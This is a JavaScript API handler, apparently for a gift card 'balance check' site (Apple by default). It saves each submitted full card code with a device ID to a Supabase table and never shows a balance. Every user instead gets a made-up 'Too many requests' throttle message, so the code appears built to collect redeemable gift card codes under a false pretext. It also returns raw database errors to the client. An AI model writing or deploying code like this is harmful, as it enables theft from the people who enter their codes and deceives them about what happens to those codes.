import { supabase } from '../../lib/supabase'

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })
  const { cardNumber, type = 'apple', deviceId } = req.body || {}

  // Basic validation - allow alphanumeric characters without strict length check
  if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
    return res.status(400).json({ error: 'Invalid card code format. Please enter a valid code.' })
  }

  // Mock behavior: We no longer return a balance. Instead, show a throttle message for privacy.
  const last4 = cardNumber.slice(-4)
  const balance = 0 // Store 0 in DB as we don't want to show balances

  // Simulate occasional errors for testing
  if (cardNumber.startsWith('XXXX')) return res.status(404).json({ error: 'Card not found. Please check the code and try again.' })

  const now = new Date().toISOString()
  const result = {
    card_number: cardNumber,
    balance,
    currency: 'USD',
    timestamp: now,
    type,
    device_id: deviceId
  }

  // Save to Supabase (we still save the attempt, but with 0 balance)
  try {
    // Check for duplicates from the same device
    if (deviceId) {
      const { data: existing } = await supabase
        .from('cards')
        .select('id')
        .match({ card_number: cardNumber, device_id: deviceId })
        .limit(1)

      if (existing && existing.length > 0) {
        // Return result but skip insert as per user request
        return res.status(200).json({
          ...result,
          cardNumber: result.card_number,
          cardLast4: last4,
          isDuplicate: true,
          message: 'This card has already been submitted from your device. Please wait a moment.'
        })
      }
    }

    const { error } = await supabase
      .from('cards')
      .insert([result])

    if (error) {
      console.error('Supabase insert error details:', error)
      // If table doesn't exist, we notify the user
      if (error.code === '42P01') {
        return res.status(500).json({ error: 'Database table "cards" not found. Please run the SQL setup script.' })
      }
      throw error
    }
  } catch (err) {
    console.error(`Failed to save ${type} card to Supabase:`, err)
    // Return a more descriptive error for the developer to see in logs
    return res.status(500).json({
      error: `Database save failed: ${err.message || 'Unknown error'}`,
      details: err
    })
  }

  return res.status(200).json({
    ...result,
    cardNumber: result.card_number,
    cardLast4: last4,
    message: result.message || 'Too many requests. Please wait a minute and try again later.'
  })
}
